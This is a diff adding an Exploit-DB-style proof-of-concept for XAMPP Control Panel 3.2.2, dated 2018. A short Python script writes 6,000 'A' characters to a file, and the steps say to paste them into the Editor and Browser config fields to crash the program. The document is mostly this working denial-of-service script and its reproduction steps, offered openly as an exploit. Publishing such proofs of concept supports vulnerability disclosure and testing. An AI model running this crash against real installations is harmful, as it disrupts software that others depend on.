@@ -1,0 +1,29 @@
+# Exploit Title: XAMPP Control Panel 3.2.2 - Denial of Service (PoC)
+# Exploit Author: Gionathan "John" Reale 
+# Date: 2018-09-14
+# Software: XAMPP 
+# Version: 3.2.2 / 7.2.9 (Newest version at time of writing)
+# Download: https://sourceforge.net/projects/xampp/files/XAMPP%20Windows/7.2.9/xampp-portable-win32-7.2.9-0-VC15-installer.exe/download
+# Tested on: Windows 7 32bit
+
+# Steps to Reproduce: 
+# Run the python exploit script, it will create a new file with the name "exploit.txt".
+# Copy the contents of "exploit.txt" 
+# Start the program and click "Config(Top Right With Symbol)"
+# Paste the contents of "exploit.txt" into the following fields:"Editor" & "Browser".
+# Click "Save" and then in the main window Click "Config" > "Apache (httpd.conf)". 
+# You will see a crash!
+
+#!/usr/bin/python
+
+buffer = "A" * 6000
+
+payload = buffer
+try:
+    f=open("exploit.txt","w")
+    print "[+] Creating %s bytes evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
